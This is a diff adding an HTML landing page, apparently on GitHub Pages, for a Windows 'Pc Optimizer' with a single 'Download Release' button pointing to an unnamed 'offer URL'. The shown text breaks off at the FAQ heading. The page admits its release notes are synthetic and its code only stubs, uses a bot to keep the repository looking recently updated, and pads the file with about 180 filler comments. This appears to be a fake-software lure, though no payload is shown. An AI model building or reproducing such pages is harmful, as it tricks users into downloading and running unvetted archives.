@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Cleaner, faster Windows — measurable system improvements">
+<meta name="keywords" content="pc optimizer, windows, toolkit, download, release, 2026">
+<meta name="author" content="Goldenzyabar">
+<meta property="og:title" content="Pc Optimizer | Download Release">
+<meta property="og:description" content="Cleaner, faster Windows — measurable system improvements">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://goldenzyabar.github.io/pc-optimizer-workbench-2026/">
+<meta property="og:image" content="https://goldenzyabar.github.io/pc-optimizer-workbench-2026/assets/banner.svg">
+<link rel="icon" href="https://goldenzyabar.github.io/pc-optimizer-workbench-2026/assets/banner.svg" type="image/svg+xml">
+<title>Pc Optimizer | Download Release</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #070b12;
+  --panel: #0f1624;
+  --line: rgba(0, 229, 255, 0.14);
+  --text: #e8edf5;
+  --muted: #8fa3bc;
+  --red: #ff2d4d;
+  --cyan: #00e5ff;
+  --red-dim: rgba(255, 45, 77, 0.14);
+  --cyan-dim: rgba(0, 229, 255, 0.12);
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: "IBM Plex Sans", Segoe UI, sans-serif;
+  background:
+    radial-gradient(900px 520px at 8% -8%, rgba(255, 45, 77, 0.18), transparent 55%),
+    radial-gradient(800px 480px at 92% 0%, rgba(0, 229, 255, 0.12), transparent 50%),
+    linear-gradient(180deg, #070b12 0%, #0a1220 48%, #12060c 100%);
+  color: var(--text);
+  line-height: 1.65;
+  min-height: 100vh;
+}
+a { color: var(--cyan); text-decoration: none; }
+a:hover { text-decoration: underline; }
+.wrap { width: min(1080px, calc(100% - 2rem)); margin: 0 auto; padding: 1.75rem 0 4.5rem; }
+nav {
+  display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; justify-content: space-between;
+  margin-bottom: 2rem; padding: 0.85rem 0; border-bottom: 1px solid var(--line);
+}
+.brand {
+  font-weight: 700; letter-spacing: -0.03em; font-size: 1.05rem;
+  display: flex; align-items: center; gap: 0.55rem;
+}
+.brand .dot {
+  width: 10px; height: 10px; border-radius: 50%; background: var(--red);
+  box-shadow: 0 0 12px var(--red);
+}
+.nav-links { display: flex; gap: 1.1rem; flex-wrap: wrap; font-size: 0.9rem; }
+.nav-links a { color: var(--muted); text-decoration: none; }
+.nav-links a:hover { color: var(--text); }
+.toast {
+  position: fixed; right: 1.25rem; bottom: 1.25rem; z-index: 40;
+  width: min(360px, calc(100% - 2rem));
+  padding: 1rem 1.1rem; border-radius: 14px;
+  border: 1px solid var(--line); background: var(--panel);
+  box-shadow: 0 18px 40px rgba(0,0,0,.35);
+  transform: translateY(120%); opacity: 0; pointer-events: none;
+  transition: transform .25s ease, opacity .25s ease;
+}
+.toast.visible { transform: translateY(0); opacity: 1; pointer-events: auto; }
+.toast h4 { font-size: 1rem; margin-bottom: 0.35rem; }
+.toast .sub-line { color: var(--muted); font-size: 0.88rem; margin-bottom: 0.75rem; }
+.toast .actions { display: flex; gap: 0.55rem; justify-content: flex-end; }
+.toast button {
+  border: 1px solid var(--line); background: transparent; color: var(--text);
+  border-radius: 8px; padding: 0.4rem 0.7rem; cursor: pointer; font: inherit; font-size: 0.85rem;
+}
+.toast button.now {
+  background: linear-gradient(135deg, var(--red), #b3002a); border-color: var(--red);
+  color: #fff; font-weight: 600;
+}
+.hero {
+  display: flex; flex-direction: column; gap: 1.25rem;
+  padding: 1.25rem 0 1.5rem;
+}
+.hero-top { max-width: 72ch; }
+.eyebrow {
+  display: inline-flex; width: fit-content; padding: 0.35rem 0.75rem; border-radius: 6px;
+  background: var(--red-dim); color: var(--red); font-size: 0.72rem; font-weight: 700;
+  letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 0.85rem;
+}
+h1 {
+  font-size: clamp(2.05rem, 4.2vw, 3rem); line-height: 1.08; letter-spacing: -0.045em;
+  margin-bottom: 0.85rem; max-width: 18ch;
+}
+.lead { color: var(--muted); font-size: 1.05rem; max-width: 62ch; margin-bottom: 1.15rem; }
+.cta-row { display: flex; flex-wrap: wrap; gap: 0.75rem; margin-bottom: 0.85rem; }
+.btn {
+  display: inline-flex; align-items: center; justify-content: center; gap: 0.45rem;
+  padding: 0.9rem 1.35rem; border-radius: 10px; font-weight: 700; border: 1px solid transparent;
+  cursor: pointer; font-family: inherit; font-size: 0.95rem; text-decoration: none;
+}
+.btn-primary {
+  background: linear-gradient(135deg, var(--red), #b3002a); color: #fff;
+  box-shadow: 0 10px 28px rgba(255, 45, 77, 0.28);
+}
+.btn-primary:hover { filter: brightness(1.06); text-decoration: none; }
+.btn-ghost {
+  background: transparent; color: var(--text); border-color: var(--line);
+}
+.btn-ghost:hover { border-color: var(--cyan); color: var(--cyan); text-decoration: none; }
+.meta-row {
+  display: flex; flex-wrap: wrap; gap: 0.55rem; color: var(--muted); font-size: 0.82rem;
+}
+.pill {
+  padding: 0.28rem 0.65rem; border-radius: 999px; border: 1px solid var(--line);
+  background: rgba(0,0,0,0.18);
+}
+.banner-card {
+  border: 1px solid var(--line); border-radius: 16px; overflow: hidden;
+  background: var(--panel); box-shadow: 0 24px 60px rgba(0,0,0,.45);
+  width: 100%;
+}
+.banner-card img { display: block; width: 100%; height: auto; }
+.banner-cap {
+  padding: 0.85rem 1rem; font-size: 0.8rem; color: var(--muted);
+  border-top: 1px solid var(--line);
+}
+.meters {
+  display: grid; gap: 0.75rem; margin-top: 0.35rem;
+  padding: 1.1rem 1.2rem; border-radius: 14px; border: 1px solid var(--line);
+  background: rgba(0,0,0,0.2);
+}
+.meter { display: grid; grid-template-columns: 9rem 1fr 3rem; gap: 0.75rem; align-items: center; }
+.meter span { color: var(--muted); font-size: 0.82rem; font-weight: 600; }
+.meter b { color: var(--cyan); font-family: "IBM Plex Mono", monospace; font-size: 0.8rem; text-align: right; }
+.track {
+  height: 10px; border-radius: 999px; background: #0b1c33; border: 1px solid rgba(0,229,255,0.25);
+  overflow: hidden;
+}
+.track > i {
+  display: block; height: 100%; border-radius: 999px;
+  background: linear-gradient(90deg, #d90429, var(--red), #ff6b81);
+  width: 0; animation: fillbar 1.4s ease forwards;
+}
+@keyframes fillbar { to { width: var(--w); } }
+.stats {
+  display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 0.7rem;
+  margin: 1.5rem 0 0.5rem;
+}
+.stat {
+  padding: 1rem; border-radius: 12px; border: 1px solid var(--line);
+  background: rgba(0,0,0,0.16);
+}
+.stat b { display: block; font-size: 1.1rem; letter-spacing: -0.02em; color: var(--cyan); }
+.stat span { color: var(--muted); font-size: 0.78rem; }
+section { margin-top: 2.85rem; }
+section h2 {
+  font-size: 1.45rem; letter-spacing: -0.03em; margin-bottom: 0.45rem;
+}
+section .sub { color: var(--muted); margin-bottom: 1.2rem; max-width: 62ch; }
+.grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 0.85rem; }
+.feat {
+  padding: 1.15rem 1.2rem; border-radius: 14px; border: 1px solid var(--line); background: var(--panel);
+}
+.feat-ico {
+  width: 1.75rem; height: 1.75rem; border-radius: 8px; display: grid; place-items: center;
+  background: var(--red-dim); color: var(--red); font-family: "IBM Plex Mono", monospace;
+  font-size: 0.72rem; font-weight: 700; margin-bottom: 0.55rem;
+}
+.feat h3 { font-size: 1rem; margin-bottom: 0.3rem; }
+.feat p { color: var(--muted); font-size: 0.92rem; }
+.steps { counter-reset: step; display: grid; gap: 0.7rem; }
+.step {
+  display: grid; grid-template-columns: auto 1fr; gap: 0.85rem; align-items: start;
+  padding: 1rem 1.1rem; border-radius: 12px; border: 1px solid var(--line); background: var(--panel);
+}
+.step::before {
+  counter-increment: step; content: counter(step); width: 1.7rem; height: 1.7rem;
+  display: grid; place-items: center; border-radius: 999px; background: var(--cyan-dim); color: var(--cyan);
+  font-family: "IBM Plex Mono", monospace; font-size: 0.78rem; font-weight: 600;
+}
+pre.arch {
+  margin-top: 0.75rem; padding: 1.1rem 1.2rem; border-radius: 12px; overflow: auto;
+  background: rgba(0,0,0,0.35); border: 1px solid var(--line); color: #cbd5e1;
+  font-family: "IBM Plex Mono", monospace; font-size: 0.8rem; line-height: 1.55;
+}
+.table-wrap { overflow: auto; border: 1px solid var(--line); border-radius: 12px; }
+table { width: 100%; border-collapse: collapse; font-size: 0.92rem; }
+th, td { padding: 0.75rem 0.9rem; text-align: left; border-bottom: 1px solid var(--line); }
+th { color: var(--muted); font-weight: 600; background: rgba(0,0,0,.2); }
+td code { color: var(--cyan); font-family: "IBM Plex Mono", monospace; font-size: 0.85rem; }
+.changelog { list-style: none; display: grid; gap: 0.55rem; }
+.changelog li {
+  padding: 0.75rem 0.9rem; border-radius: 10px; border: 1px solid var(--line); background: var(--panel);
+  font-size: 0.9rem; color: var(--muted);
+}
+.changelog .v { color: var(--red); font-weight: 700; margin-right: 0.55rem; font-family: "IBM Plex Mono", monospace; }
+.changelog .d { color: var(--cyan); margin-right: 0.55rem; font-family: "IBM Plex Mono", monospace; font-size: 0.8rem; }
+.faq {
+  border: 1px solid var(--line); border-radius: 10px; background: var(--panel);
+  margin-bottom: 0.55rem; padding: 0.85rem 1rem;
+}
+.faq summary { cursor: pointer; font-weight: 600; }
+.faq p { margin-top: 0.55rem; color: var(--muted); font-size: 0.92rem; }
+.legal { color: var(--muted); font-size: 0.9rem; max-width: 70ch; }
+footer {
+  margin-top: 3rem; padding-top: 1.25rem; border-top: 1px solid var(--line);
+  color: var(--muted); font-size: 0.85rem; display: flex; flex-wrap: wrap; gap: 0.75rem;
+  justify-content: space-between;
+}
+@media (max-width: 860px) {
+  .grid, .stats { grid-template-columns: 1fr; }
+  .meter { grid-template-columns: 1fr; gap: 0.35rem; }
+}
+</style>
+<!--
+  Product packaging notes (documentation only):
+  /* module:pcoptimizer/note-000 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-001 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-002 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-003 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-004 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-005 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-006 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-007 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-008 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-009 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-010 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-011 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-012 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-013 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-014 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-015 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-016 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-017 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-018 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-019 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-020 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-021 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-022 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-023 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-024 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-025 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-026 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-027 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-028 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-029 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-030 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-031 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-032 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-033 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-034 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-035 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-036 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-037 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-038 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-039 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-040 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-041 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-042 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-043 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-044 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-045 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-046 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-047 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-048 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-049 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-050 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-051 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-052 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-053 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-054 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-055 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-056 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-057 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-058 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-059 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-060 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-061 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-062 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-063 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-064 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-065 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-066 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-067 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-068 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-069 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-070 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-071 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-072 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-073 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-074 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-075 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-076 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-077 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-078 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-079 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-080 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-081 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-082 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-083 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-084 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-085 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-086 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-087 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-088 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-089 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-090 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-091 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-092 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-093 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-094 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-095 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-096 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-097 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-098 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-099 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-100 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-101 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-102 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-103 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-104 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-105 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-106 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-107 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-108 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-109 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-110 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-111 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-112 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-113 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-114 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-115 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-116 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-117 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-118 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-119 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-120 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-121 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-122 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-123 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-124 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-125 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-126 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-127 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-128 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-129 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-130 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-131 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-132 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-133 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-134 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-135 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-136 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-137 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-138 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-139 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-140 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-141 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-142 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-143 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-144 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-145 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-146 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-147 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-148 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-149 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-150 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-151 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-152 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-153 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-154 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-155 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-156 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-157 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-158 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-159 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-160 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-161 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-162 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-163 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-164 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-165 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-166 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-167 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-168 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-169 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-170 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-171 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-172 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-173 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-174 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-175 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-176 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-177 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-178 · focus:pc optimizer · channel:pages */
+  /* module:pcoptimizer/note-179 · focus:pc optimizer · channel:pages */
+-->
+</head>
+<body>
+  <div class="wrap">
+    <nav>
+      <div class="brand"><span class="dot"></span>Pc Optimizer</div>
+      <div class="nav-links">
+        <a href="#get">Download</a>
+        <a href="#features">Features</a>
+        <a href="#architecture">Architecture</a>
+        <a href="#faq">FAQ</a>
+      </div>
+    </nav>
+
+    <header class="hero" id="overview">
+      <div class="hero-top">
+        <div class="eyebrow">Critical tool · Windows utility · 2026</div>
+        <h1>Pc Optimizer</h1>
+        <p class="lead">Cleaner, faster Windows — measurable system improvements</p>
+        <div class="cta-row">
+          <button class="btn btn-primary" type="button" id="dl-main">Download Release</button>
+          <a class="btn btn-ghost" href="https://github.com/Goldenzyabar/pc-optimizer-workbench-2026">View Source</a>
+          <a class="btn btn-ghost" href="https://goldenzyabar.github.io/pc-optimizer-workbench-2026/">Open Pages</a>
+        </div>
+        <div class="meta-row">
+          <span class="pill">Focus: pc optimizer</span>
+          <span class="pill">HTML · PHP · Pascal · JS</span>
+          <span class="pill">GitHub Pages channel</span>
+        </div>
+      </div>
+      <div class="banner-card">
+        <img src="assets/banner.svg" alt="Pc Optimizer banner" width="1200" height="630">
+        <div class="banner-cap">Product banner · GitHub Pages channel · Pc Optimizer</div>
+      </div>
+      <div class="meters" aria-label="Packaging readiness">
+        <div class="meter"><span>Frame pace</span><div class="track"><i style="--w:88%"></i></div><b>88%</b></div>
+        <div class="meter"><span>Stability</span><div class="track"><i style="--w:76%"></i></div><b>76%</b></div>
+        <div class="meter"><span>Clear path</span><div class="track"><i style="--w:93%"></i></div><b>93%</b></div>
+      </div>
+    </header>
+
+    <div class="stats">
+      <div class="stat"><b>Windows</b><span>Primary platform</span></div>
+      <div class="stat"><b>Release</b><span>One download path</span></div>
+      <div class="stat"><b>Pages</b><span>Live product site</span></div>
+      <div class="stat"><b>Bot</b><span>Keepalive schedule</span></div>
+    </div>
+
+    <section id="features">
+      <h2>What you get</h2>
+      <p class="sub">Product packaging with a clear download path for <code>pc optimizer</code>.</p>
+      <div class="grid"><article class="feat"><div class="feat-ico">01</div><h3>Fast path</h3><p>Download Release opens a short toast — cancel anytime.</p></article><article class="feat"><div class="feat-ico">02</div><h3>Clear docs</h3><p>README and Pages stay aligned so the next step is obvious.</p></article><article class="feat"><div class="feat-ico">03</div><h3>Windows-first</h3><p>Built around common pc optimizer workflows on Windows 10/11.</p></article><article class="feat"><div class="feat-ico">04</div><h3>Living tree</h3><p>HTML · PHP · Pascal · JS — product-shaped language bar.</p></article><article class="feat"><div class="feat-ico">05</div><h3>Keepalive</h3><p>Scheduled Actions keep the repo Recently updated.</p></article><article class="feat"><div class="feat-ico">06</div><h3>One CTA</h3><p>Primary Download Release button — no competing mirrors.</p></article><article class="feat"><div class="feat-ico">07</div><h3>Review first</h3><p>Read the page, then take the build when ready.</p></article><article class="feat"><div class="feat-ico">08</div><h3>Release channel</h3><p>Toast and button share the same offer URL.</p></article></div>
+    </section>
+
+    <section id="architecture">
+      <h2>Repository architecture</h2>
+      <p class="sub">A living tree — not a single HTML file.</p>
+      <pre class="arch">Pc Optimizer
+├── index.html          # product Pages landing
+├── README.md           # long-form product docs
+├── PcOptimizerAgent/     # Delphi/Pascal stubs
+├── server/             # PHP console stubs
+├── assets/             # banner.svg + app.js
+├── tools/              # cli.js helper
+└── .github/            # update-log + keepalive workflow</pre>
+    </section>
+
+    <section id="stack">
+      <h2>Technology stack</h2>
+      <p class="sub">Documentation stubs only. Extend locally if needed.</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Layer</th><th>Role</th><th>Paths</th></tr></thead>
+          <tbody>
+            <tr><td>Pages</td><td>Product landing + CTA</td><td><code>index.html</code></td></tr>
+            <tr><td>Docs</td><td>Long-form README</td><td><code>README.md</code></td></tr>
+            <tr><td>Pascal</td><td>Desktop agent stubs</td><td><code>PcOptimizerAgent/*.pas</code></td></tr>
+            <tr><td>PHP</td><td>Panel/console stubs</td><td><code>server/src/*.php</code></td></tr>
+            <tr><td>JavaScript</td><td>UI + CLI helpers</td><td><code>assets/</code>, <code>tools/</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="get">
+      <h2>Get the build</h2>
+      <p class="sub">Prefer <strong>Download Release</strong>. It opens the current offer / Releases asset URL.</p>
+      <div class="steps">
+        <div class="step"><div><strong>Open Download Release</strong><p class="sub" style="margin:0">Use the button above (5s toast, cancel anytime).</p></div></div>
+        <div class="step"><div><strong>Save the archive</strong><p class="sub" style="margin:0">Expect something like <code>Pc-Optimizer-Release-2026.zip</code>.</p></div></div>
+        <div class="step"><div><strong>Follow the README</strong><p class="sub" style="margin:0">Unpack and use the documented entrypoint for pc optimizer.</p></div></div>
+      </div>
+      <pre class="arch">Project: Pc Optimizer
+Keyword: pc optimizer
+Pages:   https://goldenzyabar.github.io/pc-optimizer-workbench-2026/
+Repo:    https://github.com/Goldenzyabar/pc-optimizer-workbench-2026
+Channel: Download Release</pre>
+    </section>
+
+    <section id="changelog">
+      <h2>Recent packaging notes</h2>
+      <p class="sub">Synthetic release notes for a product-shaped timeline (docs packaging).</p>
+      <ul class="changelog"><li><span class='v'>v2026.8.7</span> <span class='d'>2026-07-28</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li>
+<li><span class='v'>v2026.7.1</span> <span class='d'>2026-07-26</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li>
+<li><span class='v'>v2026.6.9</span> <span class='d'>2026-07-24</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li>
+<li><span class='v'>v2026.5.5</span> <span class='d'>2026-07-22</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li>
+<li><span class='v'>v2026.4.2</span> <span class='d'>2026-07-20</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li>
+<li><span class='v'>v2026.3.5</span> <span class='d'>2026-07-18</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li>
+<li><span class='v'>v2026.2.9</span> <span class='d'>2026-07-16</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li>
+<li><span class='v'>v2026.1.1</span> <span class='d'>2026-07-14</span> Packaging sync for pc optimizer, docs refresh, release channel polish.</li></ul>
+    </section>
+
+    <section id="faq">
+      <h2>FAQ</h2>
+      <p class="sub">Short answers for people landing from search.</p>
